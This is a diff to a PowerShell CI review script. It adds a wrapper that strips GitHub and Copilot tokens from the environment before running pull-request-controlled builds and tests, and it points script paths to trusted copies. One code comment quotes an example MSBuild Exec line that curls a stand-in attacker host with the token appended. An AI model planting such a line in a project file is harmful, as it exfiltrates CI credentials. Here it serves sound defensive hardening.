@@ -93,7 +93,9 @@ if (-not $RepoRoot) { Write-Error "Not in a git repository"; exit 1 }
 # exactly the secrets it needs in its env: block.
 #
 # Task 1 (Setup):         env: GH_TOKEN.             No dotnet, no copilot.
-# Task 2 (Gate):          env: GH_TOKEN (read-only).  dotnet build/test + PR metadata.
+# Task 2 (Gate):          env: GH_TOKEN.  PR-code subprocesses (dotnet test,
+#                         BuildAndRunHostApp.ps1, etc.) are wrapped via
+#                         Invoke-WithoutGhTokens so they cannot exfiltrate the token.
 # Task 3 (CopilotReview): env: COPILOT_GITHUB_TOKEN. copilot → dotnet (stripped).
 # Task 4 (Post):          env: GH_TOKEN.             Trusted scripts, no dotnet.
 #
@@ -106,8 +108,33 @@ $runPost          = -not $Phase -or $Phase -eq 'Post'
 
 # Resolve the scripts directory — use TrustedScriptsDir if provided (CI),
 # otherwise use the repo's own .github/ directory (local dev).
-$ScriptsDir = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'scripts' } else { $PSScriptRoot }
-$SkillsDir  = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'skills' } else { Join-Path $PSScriptRoot '../skills' }
+$ScriptsDir    = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'scripts' }     else { $PSScriptRoot }
+$SkillsDir     = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'skills' }      else { Join-Path $PSScriptRoot '../skills' }
+$EngScriptsDir = if ($TrustedScriptsDir) { Join-Path $TrustedScriptsDir 'eng-scripts' } else { Join-Path $PSScriptRoot '../../eng/scripts' }
+
+# Gate has GH_TOKEN in env so trusted code (Detect-TestsInDiff, Find-RegressionRisks,
+# detect-ui-test-categories) can fetch PR metadata via `gh` CLI. Any subprocess that
+# executes PR-controlled code (MSBuild targets, test code, source generators, host-app
+# builds) would otherwise inherit that token and trivially exfiltrate it via something
+# like `<Exec Command="curl attacker/?t=$(GH_TOKEN)" />` in a .csproj or
+# Directory.Build.targets. Wrap every such invocation in Invoke-WithoutGhTokens.
+function Invoke-WithoutGhTokens {
+    [CmdletBinding()]
+    param([Parameter(Mandatory)][scriptblock]$ScriptBlock)
+    $saved = @{
+        GH_TOKEN             = $env:GH_TOKEN
+        GITHUB_TOKEN         = $env:GITHUB_TOKEN
+        COPILOT_GITHUB_TOKEN = $env:COPILOT_GITHUB_TOKEN
+    }
+    try {
+        $env:GH_TOKEN             = $null
+        $env:GITHUB_TOKEN         = $null
+        $env:COPILOT_GITHUB_TOKEN = $null
+        & $ScriptBlock
+    } finally {
+        foreach ($k in $saved.Keys) { Set-Item -Path ("env:" + $k) -Value $saved[$k] }
+    }
+}
 
 # ─── Banner ───────────────────────────────────────────────────────────────────
 Write-Host ""
@@ -693,7 +720,7 @@ Write-Host "╚═════════════════════�
 
 $uitestCategories = ""
 
-$detectScript = Join-Path $RepoRoot "eng/scripts/detect-ui-test-categories.ps1"
+$detectScript = Join-Path $EngScriptsDir "detect-ui-test-categories.ps1"
 if (Test-Path $detectScript) {
     try {
         $detectOutput = & pwsh -NoProfile -File $detectScript -PrNumber "$PRNumber" 2>&1
@@ -822,11 +849,12 @@ if ($uitestCategories -eq 'NONE') {
         $testExitCode = -1
         $envErrHit = $null
         try {
-            $runResult = & $sharedRunner `
+            $runResult = Invoke-WithoutGhTokens { & $sharedRunner `
                 -Platform $uitestPlatform `
                 -Category $cat `
                 -RepoRoot $RepoRoot `
                 -LogFile $catLogPath
+            }
             if ($runResult) {
                 $testOutput   = $runResult.Output
                 $testExitCode = $runResult.ExitCode
@@ -1282,8 +1310,8 @@ if ($risksData -and ($risksData.result -eq 'REVERT' -or $risksData.result -eq 'O
         $regrTestDetails = @()
 
         $regrPlatform = if ($Platform) { $Platform } else { "android" }
-        $uiTestRunner = Join-Path $RepoRoot ".github/scripts/BuildAndRunHostApp.ps1"
-        $deviceTestRunner = Join-Path $RepoRoot ".github/skills/run-device-tests/scripts/Run-DeviceTests.ps1"
+        $uiTestRunner = Join-Path $ScriptsDir "BuildAndRunHostApp.ps1"
+        $deviceTestRunner = Join-Path $SkillsDir "run-device-tests/scripts/Run-DeviceTests.ps1"
 
         foreach ($t in $regressionTests) {
             Write-Host ""
@@ -1294,7 +1322,7 @@ if ($risksData -and ($risksData.result -eq 'REVERT' -or $risksData.result -eq 'O
                     'UITest' {
                         if (Test-Path $uiTestRunner) {
                             Write-Host "    🖥️ Running UI test via BuildAndRunHostApp.ps1 -Platform $regrPlatform -TestFilter `"$($t.Filter)`"" -ForegroundColor Cyan
-                            $testOutput = & $uiTestRunner -Platform $regrPlatform -TestFilter $t.Filter 2>&1
+                            $testOutput = Invoke-WithoutGhTokens { & $uiTestRunner -Platform $regrPlatform -TestFilter $t.Filter 2>&1 }
                             $testExitCode = $LASTEXITCODE
                             $testOutput | Select-Object -Last 20 | ForEach-Object { Write-Host "    $_" }
                         } else {
@@ -1306,7 +1334,7 @@ if ($risksData -and ($risksData.result -eq 'REVERT' -or $risksData.result -eq 'O
                         if (Test-Path $deviceTestRunner) {
                             $dtProject = if ($t.Project) { $t.Project } else { 'Controls' }
                             Write-Host "    📱 Running device test via Run-DeviceTests.ps1 -Project $dtProject -Platform $regrPlatform -TestFilter `"$($t.Filter)`"" -ForegroundColor Cyan
-                            $testOutput = & $deviceTestRunner -Project $dtProject -Platform $regrPlatform -TestFilter $t.Filter 2>&1
+                            $testOutput = Invoke-WithoutGhTokens { & $deviceTestRunner -Project $dtProject -Platform $regrPlatform -TestFilter $t.Filter 2>&1 }
                             $testExitCode = $LASTEXITCODE
                             $testOutput | Select-Object -Last 20 | ForEach-Object { Write-Host "    $_" }
                         } else {
@@ -1318,7 +1346,7 @@ if ($risksData -and ($risksData.result -eq 'REVERT' -or $risksData.result -eq 'O
                         if ($t.ProjectPath) {
                             $resolvedProj = Join-Path $RepoRoot $t.ProjectPath
                             Write-Host "    🧪 Running: dotnet test $($t.ProjectPath) --filter `"$($t.Filter)`"" -ForegroundColor Cyan
-                            $testOutput = dotnet test $resolvedProj --filter $t.Filter --logger "console;verbosity=minimal" 2>&1
+                            $testOutput = Invoke-WithoutGhTokens { dotnet test $resolvedProj --filter $t.Filter --logger "console;verbosity=minimal" 2>&1 }
                             $testExitCode = $LASTEXITCODE
                             $testOutput | Select-Object -Last 20 | ForEach-Object { Write-Host "    $_" }
                         } else {
@@ -1459,7 +1487,7 @@ for ($gateAttempt = 1; $gateAttempt -le $maxGateAttempts; $gateAttempt++) {
     # PR like a regression repro), it falls back to "verify failure only" mode
     # and reports whether the new tests fail without any fix. Passing the flag
     # would force the script to error out for those PRs.
-    $gateOutput = & pwsh -NoProfile -File "$verifyScript" -Platform $gatePlatform -PRNumber $PRNumber 2>&1
+    $gateOutput = Invoke-WithoutGhTokens { & pwsh -NoProfile -File "$verifyScript" -Platform $gatePlatform -PRNumber $PRNumber 2>&1 }
     $gateExitCode = $LASTEXITCODE
     $gateOutput | ForEach-Object { Write-Host "    $_" }
 
